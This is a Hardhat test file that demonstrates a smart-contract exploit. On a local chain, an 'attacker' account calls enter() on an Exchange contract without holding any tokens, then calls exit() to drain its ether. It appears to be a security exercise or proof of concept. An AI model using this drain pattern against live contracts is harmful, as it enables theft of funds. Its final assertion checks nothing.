import {expect} from "chai"
import { providers } from "ethers"
import {ethers} from "hardhat"
import {StokenERC20} from "../typechain-types"
import {Exchange} from "../typechain-types"

describe("Exchange hack" , function(){
    let StokenERC20: StokenERC20
    let Exchange : Exchange 
    beforeEach(async function (){

        //Let's deploy the ERC20 Contract

        const ERC20Factory = await ethers.getContractFactory("StokenERC20")
        StokenERC20 = await ERC20Factory.deploy("1000") as StokenERC20
        await StokenERC20.deployed()

        //Let's deploy the Exchange contract
        const ExchangeFactory = await ethers.getContractFactory("Exchange")
        Exchange = await ExchangeFactory.deploy(StokenERC20.address , {value: ethers.utils.parseEther("100")}) as Exchange // It wasn't working without it 
        await Exchange.deployed()

        // 
   })

    describe("Attacker Should extract money without having any balance of ERC20" , function() {
        it("Drain Funds" , async function() {
            const [deployer , acc1 , attacker] = await ethers.getSigners()
            const provider = ethers.provider
            console.log(`Currents funds in the contract are ${ethers.utils.formatEther(await provider.getBalance(Exchange.address))} ETH` , '/n')
            //Check the owner Balance 
            const ownerBalance = await StokenERC20.balanceOf(deployer.address)
            console.log(`The balance of the owner is ${ethers.utils.formatEther(ownerBalance)} that is equal to the TotalSupply of the ERC20`, '/n')
            //Check the attacker Balance
            const attackerBalance = await StokenERC20.balanceOf(attacker.address)
            console.log(`The balance of the attacker is ${ethers.utils.formatEther(attackerBalance)} ERC20 Tokens`)
            // Pretend to deposit tokens 
            const pretenDeposit = await Exchange.connect(attacker).enter(ethers.utils.parseEther("100")) // 10 Ether
            const exchangeAttackerBalance = await Exchange.balanceOf(attacker.address)
            console.log(`The attacker address has in the contract the balance of ${ethers.utils.formatEther(exchangeAttackerBalance)}`) // Balance in the contract
            // Balance of attacker before attack 
            const balanceBattack = await provider.getBalance(attacker.address)
            //Balance of attacker after attack
            const attack = await Exchange.connect(attacker).exit(ethers.utils.parseEther("100"))
            const balanceAattack = await provider.getBalance(attacker.address)
            console.log(`The attacker balance before the attack was ${ethers.utils.formatEther(balanceBattack)} and after the attack is ${ethers.utils.formatEther(balanceAattack)}`)
            expect(balanceBattack < balanceAattack)

        })
        


    })
})